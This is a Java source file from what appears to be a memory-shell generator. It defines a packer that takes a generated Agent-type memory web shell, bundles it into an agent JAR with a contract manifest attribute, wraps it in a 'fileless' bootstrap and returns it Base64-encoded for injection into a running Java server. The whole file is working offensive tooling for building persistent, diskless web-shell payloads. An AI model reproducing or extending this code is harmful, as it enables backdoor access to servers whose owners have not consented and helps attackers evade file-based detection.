package com.reajason.javaweb.packer.jar.agent;

import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.JarPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.utils.IOUtils;
import lombok.SneakyThrows;
import org.kohsuke.MetaInfServices;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.FilelessAgent, order = 2550)
public class FilelessAgentPacker implements Packer {
    public static final String CONTRACT_ATTRIBUTE = "Fileless-Agent-Contract";

    private final AgentJarPacker agentJarPacker = new AgentJarPacker();

    @Override
    public String pack(ClassPackerConfig config) {
        throw new UnsupportedOperationException("FilelessAgent 仅支持 Agent 内存马生成结果，不能用于独立 class 打包");
    }

    @Override
    @SneakyThrows
    public String pack(MemShellResult result) {
        if (result == null || result.getShellConfig() == null
                || result.getShellConfig().getShellType() == null
                || !result.getShellConfig().getShellType().startsWith(ShellType.AGENT)) {
            throw new IllegalArgumentException("FilelessAgent requires an Agent shell type");
        }
        byte[] agentJar = withContract(agentJarPacker.packBytes(JarPackerConfig.from(result)));
        byte[] bootstrap = new FilelessPayloadAssembler().assemble(agentJar);
        return Base64.getEncoder().encodeToString(bootstrap);
    }

    private byte[] withContract(byte[] agentJar) throws Exception {
        JarInputStream source = new JarInputStream(new ByteArrayInputStream(agentJar));
        try {
            Manifest manifest = source.getManifest();
            if (manifest == null) {
                throw new IllegalStateException("Agent JAR has no manifest");
            }
            manifest.getMainAttributes().putValue(CONTRACT_ATTRIBUTE, "1");
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            JarOutputStream target = new JarOutputStream(output, manifest);
            try {
                copyEntries(source, target);
            } finally {
                target.close();
            }
            return output.toByteArray();
        } finally {
            source.close();
        }
    }

    private void copyEntries(JarInputStream source, JarOutputStream target) throws Exception {
        JarEntry entry;
        while ((entry = source.getNextJarEntry()) != null) {
            if (entry.isDirectory()) {
                continue;
            }
            target.putNextEntry(new JarEntry(entry));
            IOUtils.copy(source, target);
            target.closeEntry();
        }
    }
}
